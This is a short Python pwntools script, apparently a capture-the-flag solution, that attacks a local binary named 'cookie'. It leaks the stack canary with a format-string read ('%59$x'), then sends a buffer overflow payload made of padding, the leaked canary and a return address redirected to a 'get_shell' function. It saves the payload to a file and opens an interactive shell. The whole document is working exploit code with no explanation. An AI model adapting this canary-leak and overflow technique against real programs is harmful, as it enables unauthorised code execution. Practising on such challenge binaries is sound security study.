#!/usr/bin/python

from pwn import *
import os
import sys
from struct import pack

def main() :

    p = process('./cookie')
    data = p.recv()
    print data
    p.sendline("%59$x")
    data = p.recv()
    print data
    data = data.split('\n')
    cookie = data[0]
    cookie = '0x' + cookie
    print cookie
    cookie = int(cookie, 16)
    cookie = hex(cookie)
    print cookie
    print pack('<I', int(cookie, 16))
    get_shell = 0x0804887c
    get_shell = hex(get_shell)
    data = 'a' * 100 + pack('<I', int(cookie, 16)) + 'b' * 12 + pack('<I', int(get_shell, 16))

    exp = open("exploit.txt", 'w')
    exp.write(data)

    p.send(data)
    p.interactive()



if __name__ == "__main__" :
    main()
